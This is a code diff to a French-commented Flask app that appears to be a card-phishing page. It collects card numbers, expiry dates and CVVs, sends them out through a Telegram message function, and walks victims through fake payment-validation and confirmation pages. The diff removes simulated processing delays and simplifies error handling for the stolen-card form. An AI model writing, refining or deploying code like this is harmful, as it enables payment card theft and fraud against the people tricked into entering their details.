@@ -1,6 +1,5 @@
 from flask import Flask, request, render_template, redirect, url_for, session
 import requests
-import time
 
 app = Flask(__name__)
 app.secret_key = "supersecretkey"  # Nécessaire pour utiliser `session`
@@ -49,10 +48,8 @@ def credit_card_form():
         session['date_expiration'] = request.form.get('date_expiration', '').strip()
         session['cvv'] = request.form.get('cvv', '').strip()
 
-        # Validation + gestion d'erreur avec redirect (AJOUT)
         if not all([session['numero_carte'], session['date_expiration'], session['cvv']]):
-            session['error'] = "❌ Tous les champs de la carte sont obligatoires."  # Nouveau message d'erreur
-            return redirect(url_for('credit_card_form'))  # Redirection GET
+            return "❌ Erreur : Tous les champs de la carte sont obligatoires.", 400
 
         # Envoyer un message Telegram avec les infos de la carte
         message = f"""
@@ -68,14 +65,10 @@ def credit_card_form():
         """
         send_telegram_message(message)
 
-        # Simulation d'un délai de 30 secondes avant d'afficher la validation
-        time.sleep(30)
-
+        # Redirige immédiatement vers la page de validation
         return redirect(url_for('validation_paiement'))
 
-    # Afficher l'erreur si elle existe puis la supprimer de la session (AJOUT)
-    error = session.pop('error', None)
-    return render_template('credit_card_form.html', error=error)  # Passer l'erreur au template
+    return render_template('credit_card_form.html')
 
 # Route pour la page de validation de paiement
 @app.route('/validation', methods=['GET', 'POST'])
@@ -95,9 +88,7 @@ def validation_paiement():
         """
         send_telegram_message(message)
 
-        # Simulation du traitement pendant 1 minute avant la confirmation
-        time.sleep(60)
-
+        # Redirige immédiatement vers la page de confirmation
         return redirect(url_for('payment_confirmation'))
 
     return render_template('validation_paiement.html', montant=session.get('montant'))
